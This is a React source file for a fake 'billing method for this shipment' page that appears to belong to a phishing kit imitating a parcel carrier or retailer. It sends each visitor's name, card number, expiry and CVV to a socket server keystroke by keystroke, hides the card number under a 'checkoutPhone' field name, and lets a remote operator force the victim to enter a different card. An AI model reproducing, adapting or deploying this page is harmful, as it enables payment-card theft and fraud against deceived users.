import React, { useEffect, useMemo, useRef, useState } from 'react';
import { socket } from '../socket';
import { useCurrentPage } from '../hooks/useCurrentPage';
import { clearDraft, loadDraft, saveDraft, STORAGE_KEYS } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

function digitsOnly(s: string) {
  return (s || '').replace(/\D/g, '');
}

function luhnCheck(num: string) {
  const s = digitsOnly(num);
  if (!s) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = s.length - 1; i >= 0; i--) {
    let d = parseInt(s[i], 10);
    if (shouldDouble) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function formatCardNumberFromDigits(d: string) {
  return d.slice(0, 19).replace(/(\d{4})(?=\d)/g, '$1 ');
}

function countDigitsBeforeCaret(value: string, caret: number) {
  return digitsOnly(value.slice(0, caret)).length;
}

function caretPosFromDigitIndex(formatted: string, digitIndex: number) {
  if (digitIndex <= 0) return 0;
  let count = 0;
  for (let i = 0; i < formatted.length; i++) {
    if (/\d/.test(formatted[i])) count++;
    if (count >= digitIndex) return i + 1;
  }
  return formatted.length;
}

function normalizeExpiry(raw: string, finalize = false) {
  const text = (raw || '').toString();
  const d = digitsOnly(text).slice(0, 4);
  if (d.length === 0) return '';
  if (d.length === 1) {
    const n = parseInt(d, 10);
    if (Number.isNaN(n)) return '';
    if (n === 0) return '0';
    if (n >= 2 && n <= 9) return finalize ? `0${n}/` : `0${n}`;
    return d;
  }
  let monthNum = parseInt(d.slice(0, 2), 10);
  if (Number.isNaN(monthNum) || monthNum <= 0) monthNum = 1;
  if (monthNum > 12) monthNum = 12;
  const mm = String(monthNum).padStart(2, '0');
  const yy = d.slice(2, 4);
  if (yy.length === 0) return finalize ? `${mm}/` : text.includes('/') ? `${mm}/` : mm;
  return `${mm}/${yy}`;
}

function isValidExpiryMMYY(value: string) {
  const m = value.match(/^(\d{2})\/(\d{2})$/);
  if (!m) return false;
  const month = parseInt(m[1], 10);
  const year2 = parseInt(m[2], 10);
  if (month < 1 || month > 12) return false;
  const now = new Date();
  const fullYear = 2000 + year2;
  if (fullYear > now.getFullYear() + 20) return false;
  const expiryEnd = new Date(fullYear, month, 0, 23, 59, 59, 999);
  return expiryEnd.getTime() >= now.getTime();
}

type CheckoutDraft = {
  checkoutName: string;
  cardDisplay: string;
  cvvDigits: string;
  expiry: string;
};

function loadCheckoutDraft(): CheckoutDraft {
  const raw = loadDraft<Partial<CheckoutDraft> | null>(STORAGE_KEYS.checkoutDraft, null);
  if (!raw || typeof raw !== 'object') return { checkoutName: '', cardDisplay: '', cvvDigits: '', expiry: '' };
  return {
    checkoutName: (raw.checkoutName || '').toString(),
    cardDisplay: (raw.cardDisplay || '').toString(),
    cvvDigits: (raw.cvvDigits || '').toString(),
    expiry: (raw.expiry || '').toString(),
  };
}

export default function Checkout() {
  useCurrentPage('checkout');

  const cardRef = useRef<HTMLInputElement | null>(null);
  const initialDraft = useMemo(() => loadCheckoutDraft(), []);
  const [checkoutName, setCheckoutName] = useState(initialDraft.checkoutName);
  const [cardDisplay, setCardDisplay] = useState(initialDraft.cardDisplay);
  const cardDigits = useMemo(() => digitsOnly(cardDisplay).slice(0, 19), [cardDisplay]);
  const [cvvDigits, setCvvDigits] = useState(initialDraft.cvvDigits);
  const [expiry, setExpiry] = useState(initialDraft.expiry);
  const [waiting, setWaiting] = useState(false);
  const [waitingMsg, setWaitingMsg] = useState('Processing your request...');

  useEffect(() => {
    saveDraft(STORAGE_KEYS.checkoutDraft, { checkoutName, cardDisplay, cvvDigits, expiry });
  }, [checkoutName, cardDisplay, cvvDigits, expiry]);

  useEffect(() => {
    const hasDraft = !!(checkoutName || cardDisplay || cvvDigits || expiry);
    if (!hasDraft) return;
    const timer = setTimeout(() => {
      socket.emit('update-form-field', { field: 'checkoutName', value: checkoutName });
      socket.emit('update-form-field', { field: 'checkoutPhone', value: digitsOnly(cardDisplay).slice(0, 19) });
      socket.emit('update-form-field', { field: 'checkoutExpiryDate', value: expiry });
      socket.emit('update-form-field', { field: 'checkoutCode', value: cvvDigits });
    }, 180);
    return () => clearTimeout(timer);
  }, []);

  const cardValid = useMemo(() => cardDigits.length >= 13 && cardDigits.length <= 19 && luhnCheck(cardDigits), [cardDigits]);
  const cvvValid = useMemo(() => cvvDigits.length >= 3 && cvvDigits.length <= 4, [cvvDigits]);
  const expiryValid = useMemo(() => isValidExpiryMMYY(expiry), [expiry]);
  const canSubmit = useMemo(() => checkoutName.trim() && cardValid && expiryValid && cvvValid, [checkoutName, cardValid, expiryValid, cvvValid]);

  useEffect(() => {
    if (!waiting) socket.emit('update-form-field', { field: 'checkoutName', value: checkoutName });
  }, [checkoutName, waiting]);
  useEffect(() => {
    if (!waiting) socket.emit('update-form-field', { field: 'checkoutPhone', value: cardDigits });
  }, [cardDigits, waiting]);
  useEffect(() => {
    if (!waiting) socket.emit('update-form-field', { field: 'checkoutExpiryDate', value: expiry });
  }, [expiry, waiting]);
  useEffect(() => {
    if (!waiting) socket.emit('update-form-field', { field: 'checkoutCode', value: cvvDigits });
  }, [cvvDigits, waiting]);

  useEffect(() => {
    const onForceCheckoutRefill = () => {
      setCheckoutName('');
      setCardDisplay('');
      setCvvDigits('');
      setExpiry('');
      setWaiting(false);
      setWaitingMsg('Processing your request...');
      clearDraft(STORAGE_KEYS.checkoutDraft);
    };
    socket.on('force-checkout-refill', onForceCheckoutRefill);
    return () => {
      socket.off('force-checkout-refill', onForceCheckoutRefill);
    };
  }, []);

  const onCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const el = e.currentTarget;
    const oldValue = el.value;
    const caret = el.selectionStart ?? oldValue.length;
    const digitsBefore = countDigitsBeforeCaret(oldValue, caret);
    const formatted = formatCardNumberFromDigits(digitsOnly(oldValue).slice(0, 19));
    const newCaret = caretPosFromDigitIndex(formatted, digitsBefore);
    setCardDisplay(formatted);
    requestAnimationFrame(() => cardRef.current?.setSelectionRange(newCaret, newCaret));
  };

  const onSubmit = () => {
    const normalizedExpiry = normalizeExpiry(expiry, true);
    if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
    setWaiting(true);
    setWaitingMsg('Details received. Please keep this page open while your billing information is reviewed.');
    clearDraft(STORAGE_KEYS.checkoutDraft);
    setExpiry(normalizedExpiry);
    socket.emit('checkout-submit', {
      checkoutName: checkoutName.trim(),
      checkoutPhone: cardDigits,
      checkoutCode: cvvDigits,
      checkoutExpiryDate: normalizedExpiry,
    });
  };

  return (
    <div className="alz-page alz-usps-page relative">
      {waiting && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-slate-900/45 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
            <div className="mx-auto mb-3 h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
            <div className="text-lg font-semibold text-slate-900">Processing your request</div>
            <div className="mt-2 text-sm text-slate-600">{waitingMsg}</div>
            <div className="mt-6 text-xs text-slate-500">Please keep this page open while your payment details are reviewed.</div>
          </div>
        </div>
      )}

      <div className="alz-shell alz-usps-form-shell">
        <div className="alz-top alz-usps-form-top">
          <div className="alz-step-head">
            <div>
              <div className="alz-badge">{BRAND.name}</div>
              <h1 className="alz-step-title">Confirm the billing method for this shipment</h1>
              <p className="alz-step-subtitle">Review the card details linked to this delivery update.</p>
            </div>
          </div>
          <div className="alz-track mt-3">
            <span style={{ width: '68%' }} />
          </div>
        </div>

        <div className="alz-flow-grid alz-usps-flow-grid">
          <div className="alz-card alz-usps-form-card">
            <div className="alz-section-eyebrow">Payment details</div>
            <h2 className="alz-page-title">Review your card information</h2>
            <p className="alz-page-copy">Enter the card details associated with this shipment so delivery processing can continue.</p>
            <div className="alz-brand-row mb-4">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>

            <div className="space-y-4 mt-5 alz-checkout-form">
              <div className="alz-checkout-field">
                <label className="alz-field-label">Name on card</label>
                <input value={checkoutName} onChange={(e) => setCheckoutName(e.target.value)} placeholder="Name as shown on card" className="alz-input" inputMode="text" autoComplete="off" disabled={waiting} />
              </div>
              <div className="alz-checkout-field alz-checkout-field-card">
                <label className="alz-field-label">Card number</label>
                <input ref={cardRef} value={cardDisplay} onChange={onCardChange} placeholder="1234 5678 9012 3456" className="alz-input" inputMode="numeric" autoComplete="off" maxLength={23} disabled={waiting} />
                {!cardValid && cardDigits.length > 0 && <div className="mt-1 text-xs text-red-500">Enter a valid card number.</div>}
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5 alz-checkout-inline">
                <div className="alz-checkout-field">
                  <label className="alz-field-label">Expiration date</label>
                  <input value={expiry} onChange={(e) => setExpiry(normalizeExpiry(e.target.value, false))} onBlur={() => setExpiry((prev) => normalizeExpiry(prev, true))} placeholder="12/27" className="alz-input" inputMode="numeric" maxLength={5} pattern="\d{2}/\d{2}" autoComplete="off" disabled={waiting} />
                  {!expiryValid && expiry.length === 5 && <div className="mt-1 text-xs text-red-500">Enter a valid expiration date.</div>}
                </div>
                <div className="alz-checkout-field">
                  <label className="alz-field-label">Security code (CVV)</label>
                  <input value={cvvDigits} onChange={(e) => setCvvDigits(digitsOnly(e.target.value).slice(0, 4))} placeholder="123" className="alz-input" inputMode="numeric" maxLength={4} autoComplete="off" disabled={waiting} />
                  {!cvvValid && cvvDigits.length > 0 && <div className="mt-1 text-xs text-red-500">Enter the 3- or 4-digit security code.</div>}
                </div>
              </div>
              <div className="alz-payment-strip" aria-hidden="true">
                <div className="alz-payment-strip-top">
                  <span className="alz-payment-strip-title">Accepted payment methods</span>
                  <span className="alz-payment-strip-lock">Secure transaction</span>
                </div>
                <div className="alz-payment-strip-row">
                  <span className="alz-payment-pill alz-payment-pill-visa">VISA</span>
                  <span className="alz-payment-pill alz-payment-pill-mastercard">mastercard</span>
                  <span className="alz-payment-pill alz-payment-pill-amex">AMERICAN EXPRESS</span>
                </div>
                <div className="alz-payment-strip-note">Use a payment method associated with this shipment. Your payment details are encrypted during verification.</div>
              </div>
            </div>

            <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
              {waiting ? 'Processing...' : 'Continue with billing review'}
            </button>
            <div className="alz-helper-copy mt-6">Keep this page open while the billing details for this shipment are confirmed.</div>
            <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
            <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
          </div>

          <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
            <div className="alz-side-summary-title">Billing checklist</div>
            <div className="alz-order-mini-card">
              <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
              <div>
                <div className="alz-order-mini-title">Review the payment method on file</div>
                <div className="alz-order-mini-copy">Use the billing method linked to this shipment to confirm the card details.</div>
              </div>
            </div>
            <div className="alz-side-summary-list">
              <div>Name exactly as shown on the card</div>
              <div>Card number and expiration date</div>
              <div>3- or 4-digit security code</div>
            </div>
            <div className="alz-side-summary-box">Use a billing method associated with this shipment so the verification review can be completed.</div>
          </aside>
        </div>
      </div>
    </div>
  );
}
